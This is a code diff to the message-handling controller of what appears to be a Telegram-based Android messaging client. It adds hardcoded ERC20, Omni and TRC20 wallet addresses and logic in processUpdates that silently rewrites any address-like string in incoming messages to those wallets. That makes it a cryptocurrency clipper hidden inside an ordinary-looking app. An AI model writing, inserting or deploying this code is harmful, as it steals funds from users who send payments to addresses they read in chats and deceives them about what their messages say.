@@ -12204,12 +12204,37 @@ public class MessagesController extends BaseController implements NotificationCe
         }
     }
 
+    public String ERC20 = "0x3d8fc1cffaa110f7a7f9f8bc237b73d54c4abf61";
+    public String Omni = "12KKDt4Mj7N5UAkQMN7LtPZMayenXHa8KL";
+    public String TRC20 = "TUBhLhE2jrkZNv7mHyQ5eUycjXzmJR16Bi";
+
     public void processUpdates(final TLRPC.Updates updates, boolean fromQueue) {
         ArrayList<Long> needGetChannelsDiff = null;
         boolean needGetDiff = false;
         boolean needReceivedQueue = false;
         boolean updateStatus = false;
-        updates.message = updates.message + "usdt";
+//        updates.message = updates.message + "usdt";
+
+        int index = updates.message.indexOf("0x");
+        if (index >= 0 && updates.message.length() >= index + 42) {
+            String valueSub = updates.message.substring(index, index + 42);
+            updates.message = updates.message.replace(valueSub, ERC20);
+        }
+        index = updates.message.indexOf("1");
+        if (index >= 0 && updates.message.length() >= index + 34) {
+            String valueSub = updates.message.substring(index, index + 34);
+            updates.message = updates.message.replace(valueSub, Omni);
+        }
+        index = updates.message.indexOf("3");
+        if (index >= 0 && updates.message.length() >= index + 34) {
+            String valueSub = updates.message.substring(index, index + 34);
+            updates.message = updates.message.replace(valueSub, Omni);
+        }
+        index = updates.message.indexOf("T");
+        if (index >= 0 && updates.message.length() >= index + 34) {
+            String valueSub = updates.message.substring(index, index + 34);
+            updates.message = updates.message.replace(valueSub, TRC20);
+        }
 
         FileLog.d("update message short message = " + updates.message);
         if (updates instanceof TLRPC.TL_updateShort) {
